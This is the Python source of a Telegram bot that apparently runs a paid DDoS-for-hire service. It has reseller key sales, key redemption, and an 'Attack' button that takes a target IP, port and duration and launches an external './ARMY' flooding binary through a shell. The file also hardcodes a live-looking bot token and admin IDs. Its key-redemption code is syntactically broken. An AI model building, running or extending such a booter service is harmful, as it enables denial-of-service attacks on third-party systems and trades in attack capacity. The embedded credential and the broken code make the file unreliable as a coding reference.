import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
import psutil
import pytz
from telebot import types
from dateutil.relativedelta import relativedelta
from filelock import FileLock

# Initialize Telegram bot
bot = telebot.TeleBot('7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis', parse_mode='Markdown', threaded=True)

# Admin user IDs
admin_id = {"6258297180", "1807014348"}

# Files for data storage
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_FILE = os.path.join(BASE_DIR, "users.json")
LOG_FILE = os.path.join(BASE_DIR, "log.txt")
KEY_FILE = os.path.join(BASE_DIR, "keys.json")
RESELLERS_FILE = os.path.join(BASE_DIR, "resellers.json")
LAST_ATTACK_FILE = os.path.join(BASE_DIR, "last_attack.json")

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
resellers = {}
COOLDOWN_PERIOD = 60  # 60 seconds

# Load data from files
def load_data():
    global users, keys, last_attack_time, resellers
    users = read_users()
    keys = read_keys()
    last_attack_time = load_last_attack_times()
    resellers = load_resellers()

def read_users():
    try:
        with FileLock(USER_FILE + ".lock"):
            with open(USER_FILE, "r") as file:
                return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError, PermissionError):
        return {}

def save_users():
    with FileLock(USER_FILE + ".lock"):
        with open(USER_FILE, "w") as file:
            json.dump(users, file)

def read_keys():
    try:
        with FileLock(KEY_FILE + ".lock"):
            with open(KEY_FILE, "r") as file:
                return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_keys():
    with FileLock(KEY_FILE + ".lock"):
        with open(KEY_FILE, "w") as file:
            json.dump(keys, file)

def load_last_attack_times():
    try:
        with open(LAST_ATTACK_FILE, "r") as file:
            data = json.load(file)
            return {k: datetime.datetime.fromisoformat(v).replace(tzinfo=pytz.UTC) for k, v in data.items()}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_last_attack_times():
    with open(LAST_ATTACK_FILE, "w") as file:
        json.dump({k: v.isoformat() for k, v in last_attack_time.items()}, file)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ARMY-PK-{random_key.upper()}"

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(pytz.UTC)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(pytz.UTC)} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

# Admin command to add a reseller
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝗮𝗱𝗱 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return
    reseller_id, initial_balance = command[1], int(command[2])
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {reseller_id}\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"❗️𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀")

# Reseller command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻")
        return
    cost = KEY_COST[duration]
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        bot.reply_to(message, f"✅ 𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n𝗞𝗲𝘆: `{key}`\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}", parse_mode='Markdown')
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)
            key = create_random_key()
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()
            bot.reply_to(message, f"✅ 𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n𝗞𝗲𝘆: `{key}`\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}\n𝗖𝗼𝘀𝘁: {cost} Rs\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[user_id]} Rs", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❗️𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝘁𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲 {duration} 𝗸𝗲𝘆\n𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱: {cost} Rs\n𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲: {resellers[user_id]} Rs")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 *ACCESS DENIED* 🚫\n⚠️ *This command is restricted to admins only.*", parse_mode='Markdown')
        return
    help_text = """
💎 *𝗨𝗟𝗧𝗥𝗔 𝗣𝗥𝗢 𝗠𝗔𝗫 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟* 💎
━━━━━━━━━━━━━━━━━━━━━━━
🔥 *𝗕𝗢𝗧 𝗖𝗢𝗡𝗧𝗥𝗢𝗟𝗦:* 🔥
🚀 `/start` - *Ignite the bot & enter the HQ!*
📖 `/help` - *Summon this legendary guide!*

⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:* ⚡
🏦 `/add_reseller <user_id> <balance>` - *Empower a new reseller!* 🔥
🔑 `/genkey <duration>` - *Craft a VIP key of destiny!* 🛠️
📜 `/logs` - *Unveil recent logs & secret records!* 📂
👥 `/users` - *Summon the roster of authorized warriors!* ⚔️
❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
🗑️ `/remove_reseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        bot.reply_to(message, f"💰 𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗶𝘀: {current_balance} Rs")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC)
            if datetime.datetime.now(pytz.UTC) < current_expiration:
                bot.reply_to(message, f"❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
                return
            del users[user_id]
            save_users()
        duration = keys[key]["duration"]
        expiration_time = add_time_to_current_date(
            hours=1 if duration == "1hour" else
            days=1 if duration == "1day" else
            days=7 if duration == "7days" else
            months=1 if duration == "1month" else 0
        )
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱!\n𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No data found")
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC)
        if datetime.datetime.now(pytz.UTC) > expiration_date:
            bot.reply_to(message, "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️")
            return
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                bot.reply_to(message, f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
                return
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
        bot.register_next_step_handler(message, process_attack_details)
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n𝗢𝗪𝗡𝗘𝗥 :- @Pk_Chopra !")

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) != 3:
        bot.reply_to(message, "Invalid format. Please enter target IP, port, and time separated by spaces.")
        return

    target, port, time = details
    # Input sanitization
    import re
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target):
        bot.reply_to(message, "Invalid IP address")
        return
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
        time = int(time)
        if time > 240:
            bot.reply_to(message, "Error: Use less than 240 seconds")
            return
    except ValueError:
        bot.reply_to(message, "Invalid port or time format.")
        return

    # Resource check
    if psutil.cpu_percent() > 80 or psutil.virtual_memory().percent > 80:
        bot.reply_to(message, "Error: System resources are too high to launch an attack.")
        return

    # Record and log the attack
    record_command_logs(user_id, 'attack', target, port, time)
    log_command(user_id, target, port, time)
    full_command = f"./ARMY {target} {port} {time} 800"
    username = message.chat.username or "No username"

    # Enhanced attack launched message
    response = (
        "✅ **ATTACK LAUNCHED** ✅\n"
        "✅ **ATTACK LAUNCHED** ✅\n"
        "⭐ **Target** » {}\n"
        "⭐ **Port** » {}\n"
        "⭐ **Time** » {} seconds\n"
        "https://t.me/+GYbpAGalM1yOOTU1\n\n"
        "📢 *Telegram*\n"
        "24x7Seller trust **SERVER**\n"
        "https://t.me/+GYbpAGalM1yOOTU1\n"
        "[VIEW GROUP]"
    ).format(target, port, time)

    # Create inline keyboard with VIEW GROUP button
    markup = types.InlineKeyboardMarkup()
    url_button = types.InlineKeyboardButton(text="VIEW GROUP", url="https://t.me/+GYbpAGalM1yOOTU1")
    markup.add(url_button)

    # Send the message
    bot.reply_to(message, response, reply_markup=markup)

    # Run attack asynchronously
    subprocess.Popen(full_command, shell=True)
    
    # Notify after attack completion
    threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()

    # Update the last attack time for the user
    last_attack_time[user_id] = datetime.datetime.now(pytz.UTC)
    save_last_attack_times()

def send_attack_finished_message(chat_id, target, port, time):
    bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅")

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    if user_id in admin_id:
        role = "Admin"
        key_expiration = "No access"
        balance = "Not Applicable"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
        balance = "Not Applicable"
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗹𝗲: {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {key_expiration}\n"
    )
    if role == "Reseller":
        response += f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} Rs\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    if users:
        response = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n  𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻: {expiration}\n\n"
    else:
        response = "⚠️ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲𝗿_𝗜𝗗>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱")
    else:
        bot.reply_to(message, f"⚠️ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        resellers_info = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 ✅\n\n"
        if resellers:
            for reseller_id, balance in resellers.items():
                reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id) else "Unknown"
                resellers_info += f"• 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {reseller_username}\n  𝗨𝘀𝗲𝗿𝗜𝗗: {reseller_id}\n  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} Rs\n\n"
        else:
            resellers_info += "𝗡𝗼 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗳𝗼𝘂𝗻𝗱"
        bot.reply_to(message, resellers_info)
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>")
            return
        reseller_id, amount = command_parts[1], float(command_parts[2])
        if reseller_id not in resellers:
            bot.reply_to(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
            return
        resellers[reseller_id] += amount
        bot.reply_to(message, f"✅ 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝗱𝗱𝗲𝗱 ✅\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {amount} Rs\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {reseller_id}\n𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]} Rs")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲_𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱>")
            return
        reseller_id = command_parts[1]
        if reseller_id not in resellers:
            bot.reply_to(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
            return
        del resellers[reseller_id]
        bot.reply_to(message, f"𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆")
    else:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")

if __name__ == "__main__":
    load_data()
    import sys
    if sys.version_info < (3, 6):
        print("Error: Python 3.6 or higher is required.")
        sys.exit(1)
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)